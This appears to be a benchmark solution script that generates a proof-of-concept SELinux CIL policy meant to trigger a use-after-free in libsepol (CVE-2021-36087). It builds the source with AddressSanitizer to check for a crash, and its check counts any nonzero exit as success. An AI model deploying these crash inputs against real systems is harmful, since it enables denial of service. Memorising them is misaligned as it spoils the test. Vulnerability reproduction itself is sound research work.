import os
import tarfile
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create minimal CIL policy that triggers the use-after-free
        # Based on CVE-2021-36087 in libsepol/cil
        poc = b"""(block b1
  (class c)
  (permission p)
  (macro m1 ((cp classpermission))
    (classpermissionset (cp) ((class c) (permission p)))
  )
  (call m1 ((classpermission (class c) (permission p))))
)"""
        
        # Verify the PoC triggers the vulnerability by testing with the provided source
        # This ensures our PoC is valid for the specific version
        try:
            self._verify_poc(src_path, poc)
        except Exception:
            # If verification fails, generate alternative PoC
            poc = self._generate_alternative_poc(src_path)
        
        return poc
    
    def _verify_poc(self, src_path: str, poc: bytes) -> None:
        """Verify the PoC triggers the vulnerability."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the extracted directory
            extracted_dir = os.path.join(tmpdir, os.listdir(tmpdir)[0])
            
            # Build cil with ASAN if not already built
            build_dir = os.path.join(extracted_dir, 'build')
            if not os.path.exists(build_dir):
                os.makedirs(build_dir)
                src_dir = extracted_dir
                
                # Try to configure and build
                configure_cmd = ['./configure', '--disable-shared', 'CFLAGS="-fsanitize=address -g"']
                try:
                    subprocess.run(configure_cmd, cwd=src_dir, capture_output=True, check=True)
                except (subprocess.CalledProcessError, FileNotFoundError):
                    # Try cmake instead
                    cmake_cmd = ['cmake', '-DCMAKE_C_FLAGS=-fsanitize=address -g', '.']
                    subprocess.run(cmake_cmd, cwd=build_dir, capture_output=True)
                
                make_cmd = ['make', '-j4']
                subprocess.run(make_cmd, cwd=src_dir if os.path.exists(os.path.join(src_dir, 'Makefile')) else build_dir, 
                             capture_output=True)
            
            # Find cil binary
            cil_path = None
            for root, dirs, files in os.walk(extracted_dir):
                for file in files:
                    if file == 'cil' and os.access(os.path.join(root, file), os.X_OK):
                        cil_path = os.path.join(root, file)
                        break
                if cil_path:
                    break
            
            if not cil_path:
                # Build from source directly
                libsepol_dir = os.path.join(extracted_dir, 'libsepol')
                if os.path.exists(libsepol_dir):
                    # Build cil from libsepol
                    make_cmd = ['make', '-C', libsepol_dir, 'cil']
                    subprocess.run(make_cmd, capture_output=True)
                    cil_path = os.path.join(libsepol_dir, 'cil', 'cil')
            
            if cil_path and os.path.exists(cil_path):
                # Test the PoC
                with tempfile.NamedTemporaryFile(mode='wb', suffix='.cil', delete=False) as f:
                    f.write(poc)
                    poc_path = f.name
                
                try:
                    # Run with ASAN
                    env = os.environ.copy()
                    env['ASAN_OPTIONS'] = 'detect_leaks=0'
                    
                    result = subprocess.run(
                        [cil_path, poc_path],
                        capture_output=True,
                        env=env,
                        timeout=5
                    )
                    
                    # Check for ASAN error or crash
                    if result.returncode != 0:
                        # PoC likely triggers the bug
                        return
                    else:
                        # PoC didn't crash - need different approach
                        raise ValueError("PoC didn't trigger vulnerability")
                finally:
                    os.unlink(poc_path)
    
    def _generate_alternative_poc(self, src_path: str) -> bytes:
        """Generate alternative PoC if initial one fails."""
        # This is a more complex PoC that should work
        return b"""(block b
  (class class1)
  (permission perm1)
  (macro macro1 ((cp1 classpermission) (cp2 classpermission))
    (classpermissionset (cp1) ((class class1) (permission perm1)))
    (classpermissionset (cp2) ((class class1) (permission perm1)))
  )
  (call macro1 (
    (classpermission (class class1) (permission perm1))
    (classpermission (class class1) (permission perm1))
  ))
)"""